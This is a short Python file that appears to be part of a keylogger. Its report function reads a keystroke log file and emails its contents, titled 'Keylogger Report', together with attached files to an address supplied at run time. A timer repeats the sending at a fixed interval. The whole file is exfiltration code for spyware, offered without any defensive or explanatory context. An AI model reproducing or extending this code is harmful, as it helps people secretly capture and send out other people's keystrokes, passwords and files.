import threading
from email_utils import send_mail

def report(email, password, interval, log_file, attachment_paths):
    # Read log file
    with open(log_file, "r") as file:
        log_data = file.read()

    # Send the email report with attachments
    send_mail(email, password, "Keylogger Report", log_data, attachment_paths)
    
    # Set up a timer to send the next report after the specified interval
    timer = threading.Timer(interval, report, [email, password, interval, log_file, attachment_paths])
    timer.start()
    